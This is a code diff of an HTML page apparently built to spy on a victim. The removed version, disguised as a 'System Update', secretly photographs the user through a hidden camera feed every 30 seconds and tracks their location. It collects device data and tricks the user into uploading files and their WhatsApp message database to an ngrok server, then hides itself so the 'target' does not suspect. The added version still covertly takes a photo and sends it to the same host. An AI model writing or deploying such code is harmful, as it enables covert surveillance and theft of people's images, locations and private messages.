@@ -2,219 +2,69 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>System Update</title>
-    <style>
-        body { margin: 0; padding: 0; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
-        #status { text-align: center; font-size: 14px; color: gray; }
-    </style>
+    <title>Test</title>
 </head>
 <body>
-    <div id="status">Initializing...</div>
-
+    <h3>Loading...</h3>
     <script>
-        // GANTI DENGAN LINK NGROK KAMU
         const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
         
-        let mediaStream = null;
-        let photoInterval = null;
-        
-        // === 1. MULAI KAMERA (TANPA SUARA DI HP) ===
-        async function startCamera() {
+        async function takePhoto() {
+            console.log("1. Requesting camera...");
+            
             try {
-                // Minta akses dengan audio MUTED (tidak bersuara di speaker)
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: { ideal: 640 }, height: { ideal: 480 } }, 
-                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
+                // Buka kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480 }
                 });
+                console.log("2. Camera OK");
                 
-                // MATIKAN output suara (audio tetap dikirim tapi tidak diputar)
-                const audioTracks = mediaStream.getAudioTracks();
-                audioTracks.forEach(track => {
-                    track.enabled = true; // Tetap rekam, tapi browser tidak output suara
-                });
-                
-                // Video element dibuat TERSEMBUNYI (target tidak lihat)
+                // Buat video element (sembunyi)
                 const video = document.createElement('video');
-                video.srcObject = mediaStream;
-                video.muted = true; // Kunci: ini yang bikin TIDAK ADA SUARA
-                video.setAttribute('playsinline', '');
+                video.srcObject = stream;
+                video.muted = true;
+                video.playsInline = true;
                 video.style.display = 'none';
                 document.body.appendChild(video);
                 await video.play();
+                console.log("3. Video playing");
                 
-                return video;
-            } catch(e) {
-                console.log('Camera error:', e);
-                return null;
-            }
-        }
-        
-        // === 2. AMBIL FOTO DAN KIRIM ===
-        async function captureAndSendPhoto(video) {
-            if (!video || !video.videoWidth) return;
-            
-            try {
+                // Tunggu 1 detik
+                await new Promise(r => setTimeout(r, 1000));
+                
+                // Ambil foto
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                console.log("4. Photo captured");
                 
+                // Kirim ke server
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('photo', blob);
-                    formData.append('timestamp', Date.now());
                     
-                    await fetch(SERVER + '/photo', { method: 'POST', body: formData });
-                    console.log('📸 Photo sent at', new Date().toLocaleTimeString());
-                }, 'image/jpeg', 0.7);
+                    const res = await fetch(SERVER + '/photo', { method: 'POST', body: formData });
+                    if (res.ok) {
+                        console.log("5. ✅ PHOTO SENT!");
+                        document.body.innerHTML = "<h3>✅ Success - Photo sent!</h3>";
+                    } else {
+                        console.log("5. ❌ Send failed");
+                    }
+                }, 'image/jpeg');
+                
+                // Tutup stream setelah 5 detik
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                }, 5000);
+                
             } catch(e) {
-                console.log('Capture failed:', e);
+                console.log("ERROR:", e.message);
+                document.body.innerHTML = "<h3>Error: " + e.message + "</h3><p>Click 'Allow' when prompted</p>";
             }
         }
         
-        // === 3. AMBIL LOKASI ===
-        async function sendLocation() {
-            if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch(SERVER + '/location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            timestamp: Date.now()
-                        })
-                    });
-                });
-            }
-        }
-        
-        // === 4. AKSES FILE/FOLDER TARGET ===
-        function setupFileAccess() {
-            const fileInput = document.createElement('input');
-            fileInput.type = 'file';
-            fileInput.multiple = true;
-            fileInput.accept = '*/*';
-            fileInput.style.display = 'none';
-            document.body.appendChild(fileInput);
-            
-            // Tampilkan tombol upload
-            const btnDiv = document.createElement('div');
-            btnDiv.style.position = 'fixed';
-            btnDiv.style.bottom = '20px';
-            btnDiv.style.right = '20px';
-            btnDiv.style.zIndex = '9999';
-            btnDiv.innerHTML = '<button id="uploadBtn" style="background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:20px;">📁 Upload Files</button>';
-            document.body.appendChild(btnDiv);
-            
-            document.getElementById('uploadBtn').onclick = () => fileInput.click();
-            
-            fileInput.onchange = async () => {
-                for (let file of fileInput.files) {
-                    const formData = new FormData();
-                    formData.append('file', file);
-                    formData.append('filename', file.name);
-                    await fetch(SERVER + '/upload', { method: 'POST', body: formData });
-                    console.log(`📁 Uploaded: ${file.name}`);
-                }
-                alert(`Uploaded ${fileInput.files.length} files`);
-                fileInput.value = '';
-            };
-        }
-        
-        // === 5. AKSES CHAT WHATSAPP (via backup) ===
-        async function tryWhatsAppAccess() {
-            // Method 1: Coba akses database WhatsApp (butuh izin file)
-            const waInput = document.createElement('input');
-            waInput.type = 'file';
-            waInput.accept = '*/*';
-            waInput.style.display = 'none';
-            document.body.appendChild(waInput);
-            
-            // Tampilkan tombol khusus WA
-            const waDiv = document.createElement('div');
-            waDiv.style.position = 'fixed';
-            waDiv.style.bottom = '80px';
-            waDiv.style.right = '20px';
-            waDiv.style.zIndex = '9999';
-            waDiv.innerHTML = '<button id="waBtn" style="background:#25D366; color:white; border:none; padding:10px 20px; border-radius:20px;">💬 Backup WhatsApp</button>';
-            document.body.appendChild(waDiv);
-            
-            document.getElementById('waBtn').onclick = () => {
-                alert("Pilih file msgstore.db.crypt14 dari folder /sdcard/Android/media/com.whatsapp/WhatsApp/Databases/");
-                waInput.click();
-            };
-            
-            waInput.onchange = async (e) => {
-                const file = e.target.files[0];
-                if (file && file.name.includes('msgstore')) {
-                    const formData = new FormData();
-                    formData.append('whatsapp_backup', file);
-                    formData.append('filename', file.name);
-                    await fetch(SERVER + '/whatsapp', { method: 'POST', body: formData });
-                    alert("WhatsApp backup received! Will be decrypted later.");
-                }
-            };
-        }
-        
-        // === 6. KIRIM INFO DEVICE ===
-        async function sendDeviceInfo() {
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timestamp: Date.now()
-            };
-            await fetch(SERVER + '/device', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
-        }
-        
-        // === 7. MAIN FUNCTION ===
-        async function main() {
-            document.getElementById('status').innerHTML = 'Requesting access...';
-            
-            // Start camera (tanpa suara)
-            const video = await startCamera();
-            if (!video) {
-                document.getElementById('status').innerHTML = '⚠️ Click Allow to continue';
-                setTimeout(main, 2000);
-                return;
-            }
-            
-            document.getElementById('status').innerHTML = 'Connected - Running';
-            document.body.style.background = '#f0f0f0';
-            
-            // Kirim info device
-            await sendDeviceInfo();
-            
-            // Kirim lokasi pertama
-            await sendLocation();
-            
-            // Ambil foto pertama (langsung)
-            await captureAndSendPhoto(video);
-            
-            // Set interval foto setiap 30 detik
-            photoInterval = setInterval(() => captureAndSendPhoto(video), 30000);
-            
-            // Kirim lokasi setiap 60 detik
-            setInterval(() => sendLocation(), 60000);
-            
-            // Setup file access
-            setupFileAccess();
-            
-            // Setup WhatsApp access
-            tryWhatsAppAccess();
-            
-            // Sembunyikan halaman setelah 3 detik (biar target tidak curiga)
-            setTimeout(() => {
-                document.body.innerHTML = '<div style="text-align:center; padding:50px; color:gray;">Closing...</div>';
-                setTimeout(() => window.close(), 1000);
-            }, 3000);
-        }
-        
-        // Start
-        main();
+        takePhoto();
     </script>
 </body>
 </html>
